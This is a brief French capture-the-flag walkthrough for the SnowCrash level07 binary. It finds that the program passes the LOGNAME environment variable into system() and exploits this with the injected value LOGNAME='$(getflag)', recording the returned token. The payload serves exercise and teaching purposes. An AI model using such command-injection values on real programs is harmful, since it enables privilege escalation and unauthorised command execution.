Level 07

je debute la commande avec ls 
-> ./level07
j'execute l'executable 
-> level07
commande : level07@SnowCrash:~$ nm -u level07
         w _Jv_RegisterClasses
         w __gmon_start__
         U __libc_start_main@@GLIBC_2.0
         U asprintf@@GLIBC_2.0
         U getegid@@GLIBC_2.0
         U getenv@@GLIBC_2.0
         U geteuid@@GLIBC_2.0
         U setresgid@@GLIBC_2.0
         U setresuid@@GLIBC_2.0
         U system@@GLIBC_2.0

nm liste les symboles d’un binaire

-u signifie undefined → fonctions non définies dans le binaire, mais utilisées depuis des bibliothèques (libc)

En clair : ça te montre quelles fonctions externes le programme appelle.

--> a regarder getenv

Ensuite : execute commande : strings level07

--> a regarder LOGNAME
/bin/echo %s

En clair :

Il lit la variable d’environnement LOGNAME

Il l’insère dans une commande /bin/echo %s

Puis il exécute cette commande avec system()

Quoi faire : export LOGNAME='$(getflag)'
./level07


resultats : Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

Reussi!! 


